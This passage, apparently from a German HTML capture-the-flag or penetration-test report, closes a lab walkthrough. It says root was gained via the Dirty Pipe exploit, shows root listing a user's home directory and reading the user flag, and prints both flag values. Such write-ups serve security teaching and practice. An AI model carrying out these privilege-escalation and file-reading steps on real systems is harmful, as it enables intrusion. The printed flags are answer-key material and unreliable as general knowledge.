+                <strong>Bewertung:</strong> Die Zeichenkette in `flag.txt` ist eindeutig die Root-Flag. Das Zitat in `important.txt` könnte eine zusätzliche Nachricht oder ein Hinweis sein, ist aber für den Abschluss des Ziels (Root Flag) nicht mehr direkt notwendig. Der Hinweis aus `/opt/note.txt`, dass `www-data` `important.txt` lesen kann, bezog sich also auf diese spezifische Datei, was durch den Dirty Pipe Exploit möglich war, der Lese- und Schreibzugriff ermöglichte.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Speichere die Root-Flag. Führe alle notwendigen Bereinigungsschritte durch (Exploits entfernen).
+                <br><strong>Empfehlung (Admin):</strong> Ändere das Root-Passwort. Stelle sicher, dass `/root/` und seine Inhalte nur für Root zugänglich sind. Entferne unnötige Dateien wie `important.txt`.
+            </p>
+
+            <p>
+                Nachdem Root-Zugriff erlangt wurde, konnte ich auch die User Flag lokalisieren und auslesen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">#</span> <span class="command">ls -la /home/darkenergy</span>
+<span class="command">total 36</span>
+<span class="command">drwx------ 3 darkenergy darkenergy 4096 Nov 21  2021 .</span>
+<span class="command">drwxr-xr-x 3 root       root       4096 Nov 10  2021 ..</span>
+<span class="command">lrwxrwxrwx 1 root       root          9 Nov 14  2021 .bash_history -&gt; /dev/null</span>
+<span class="command">-rw-r--r-- 1 darkenergy darkenergy  220 Nov 10  2021 .bash_logout</span>
+<span class="command">-rw-r--r-- 1 darkenergy darkenergy 3526 Nov 10  2021 .bashrc</span>
+<span class="command">drwxr-xr-x 3 darkenergy darkenergy 4096 Nov 10  2021 .local</span>
+<span class="command">-rw-r--r-- 1 darkenergy darkenergy  807 Nov 10  2021 .profile</span>
+<span class="command">-rw-r--r-- 1 root       root         99 Nov 14  2021 .secretNote.kdbx</span>
+<span class="command">-rw-r--r-- 1 root       root       2222 Nov 14  2021 secretPass.kdbx</span>
+<span class="password">-r-------- 1 darkenergy darkenergy   33 Nov 14  2021 userFlag.<span class="command">txt</span></span>
+<span class="password">#</span> <span class="command">cat /home/darkenergy/userFlag.txt</span>
+<span class="password">4811162d4b5326c7432d29429ca6491b</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Mit Root-Berechtigungen konnte ich nun das Home-Verzeichnis des Benutzers `darkenergy` einsehen (`ls -la /home/darkenergy/`). Die Auflistung zeigte eine Datei namens `<span class="password">userFlag.txt</span>`. Die Berechtigungen (`-r--------`) zeigen, dass nur der Besitzer (`darkenergy`) die Datei lesen darf. Als Root konnte ich die Datei dennoch mit `cat /home/darkenergy/userFlag.txt` auslesen. Der Inhalt ist die Zeichenkette `<span class="password">4811162d4b5326c7432d29429ca6491b</span>`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies ist die User Flag. Sie war, wie oft üblich, im Home-Verzeichnis des Benutzers gespeichert. Die Berechtigungen waren restriktiv, aber Root kann sie natürlich umgehen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Speichere die User Flag.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass Flags (auch User Flags) nicht auf Produktionssystemen verbleiben.
+            </p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command"># cat /home/darkenergy/userFlag.txt</div>
+                    <div class="flag-value"><span class="password">4811162d4b5326c7432d29429ca6491b</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command"># cat /root/flag.txt</div>
+                    <div class="flag-value"><span class="password">b1946ac92492d2347c6235b4d2611184</span></div>
+                </div>
+            </div>
+        </section>
+
+    </div> <!-- Ende container -->
+
+    <footer class="footer">
+        <p>Ben - Cyber Security Reports</p>
+        <p>Berichtsdatum: 19. Juni 2025</p>
+    </footer>
+
+    
+</body>
+</html>
